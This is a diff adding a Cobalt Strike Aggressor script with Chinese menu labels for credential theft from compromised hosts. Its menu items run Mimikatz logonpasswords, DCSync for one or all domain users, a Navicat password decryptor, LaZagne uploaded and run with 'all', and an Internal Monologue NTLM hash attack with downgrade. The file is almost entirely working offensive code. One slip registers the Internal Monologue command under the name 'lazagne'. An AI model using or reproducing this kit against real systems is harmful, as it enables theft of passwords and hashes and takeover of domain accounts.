@@ -1,0 +1,96 @@
+
+menu "密码抓取" {
+	menu "mimikatz" {
+		item "Mimikatz-logonpasswords" {
+		if(-isadmin $1['@'])
+		{
+			binput($1,"logonpasswords");
+			blogonpasswords($1);
+		}
+		else
+		{
+			show_error("Permission Denied!");
+		}
+	}
+		 separator();
+		 menu "Mimikatz-DCSync" {
+		 		item "指定用户" {
+		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+		 			dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
+		 			drow_text($dialog,"bid","Bid:");
+		 			drow_text($dialog,"domain","Domain:");
+		 			drow_text($dialog,"user","User:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+ 		 		}
+		 		item "全部用户" {
+		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+		 			dialog_description($dialog, "获取全部用户的密码Hash");
+		 			drow_text($dialog, "domain","Domain:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+
+		 		}
+		 }
+}
+
+separator();
+	item "Navicat-Password" {
+		    local('$bid');
+            foreach $bid ($1){
+            navicat_password($bid);
+           }
+	}
+	separator();
+	item "LaZagne" {
+		    local('$bid');
+            foreach $bid ($1){
+            lazagne_password($bid);
+            }
+	}
+	separator();
+	item "Internal-Monologue" {
+		    local('$bid');
+            foreach $bid ($1){
+            internal_monologue($bid);
+           }
+	}
+}
+
+sub navicat_password{
+	$binary = script_resource("./modules/navicatpwd.exe");
+	$help = "Automatic access to Navicat connection information and password";
+	beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "Navicat binary cannot be found at $binary");
+		return;
+	}
+	bexecute_assembly($1, $binary);
+}
+
+sub lazagne_password{
+	$binary = script_resource("./modules/lazagne.exe");
+	$help = "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer";
+	beacon_command_register("lazagne", $help, "The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "lazagne binary cannot be found at $binary");
+		return;
+	}
+	bupload($1, $binary);
+	brun($1, "lazagne.exe all");
+}
+
+sub internal_monologue{
+	$binary = script_resource("./modules/InternalMonologue.exe");
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}
